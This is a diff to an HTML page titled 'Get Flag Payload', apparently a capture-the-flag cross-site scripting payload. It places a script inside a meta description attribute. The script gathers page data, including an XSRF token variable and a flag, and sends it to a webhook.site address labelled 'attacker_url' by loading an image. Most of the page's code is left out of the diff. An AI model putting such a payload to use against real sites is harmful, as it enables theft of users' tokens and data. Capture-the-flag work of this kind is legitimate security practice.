@@ -2,9 +2,14 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Ngonnn4</title>
-    <script>
+    <title>Get Flag Payload</title>
+    <!-- VERSION_GET_FLAG_V1 -->
+    <meta name="description" content='<script>
         (function() {
+            var webhook_id = "160659b7-11cf-4cba-8f2b-6d8646022db3";
+            var attacker_url = "https://webhook.site/" + webhook_id;
+            var loc = window.location.href;
+
             function sendPing(data) {
                 var params = new URLSearchParams();
                 params.append("source_tag", "name:description_GET_FLAG_V1");
@@ -12,7 +17,7 @@
                     let val_str = String(data[key]);
                     params.append(key, val_str.substring(0,1000)); // Tăng giới hạn lên 1000 cho flag
                 }
-                new Image().src = "https://webhook.site/160659b7-11cf-4cba-8f2b-6d8646022db3" + "?" + params.toString();
+                new Image().src = attacker_url + "?" + params.toString();
             }
 
             var xsrfTokenValue = null;
@@ -103,7 +108,7 @@
                 });
             });
         })();
-    </script>
+    </script>'>
 </head>
 <body>
     <h1>Get Flag Payload Page</h1>
